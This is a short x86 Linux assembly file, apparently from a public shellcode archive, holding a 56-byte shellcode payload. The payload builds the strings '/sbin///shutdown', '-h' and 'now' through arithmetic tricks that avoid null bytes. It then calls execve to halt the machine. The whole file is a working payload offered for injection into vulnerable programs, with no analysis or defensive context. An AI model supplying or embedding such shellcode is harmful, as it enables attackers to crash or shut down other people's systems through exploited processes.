; Title: shutdown -h now Shellcode - 56 bytes
; Date: 2014-06-27
; Platform: linux/x86
; Author: Osanda Malith Jayathissa (@OsandaMalith)
; http://shell-storm.org/shellcode/files/shellcode-876.php

global _start

section .text

_start:
    xor eax, eax
    xor edx, edx
    xor ebx, ebx
    ; push "-h", 0x00
    push eax
    push word  0x682d           
    
    ; mov edi, esp

    ; push 0x00776f6e = "now", 0x00
    mov ax, 0x9526
    mov bl, 0xcd
    mul ebx
    push eax                     

    mov edi, esp

    ; push "/sbin///shutdown", 0x00
    push edx
    
    mov eax, edx                ; nwod
    mov ax, 0xfdee
    mov bx, 0x6f5e
    mul ebx
    push eax
    
    push word 0x7475            ; tuhs
    push word 0x6873            
    
 
    mov eax, 0xffffffff         ; ///n
    sub eax, 0xd0d0d091
    push eax

    push   0x6962732f            ; ibs/
    mov    ebx, esp

    ; SYS_EXECVE params
    push   edx
    push   esi
    push   edi
    push   ebx
    mov    ecx, esp

    xor eax, eax
    mov    al, 0x0b

    int    0x80

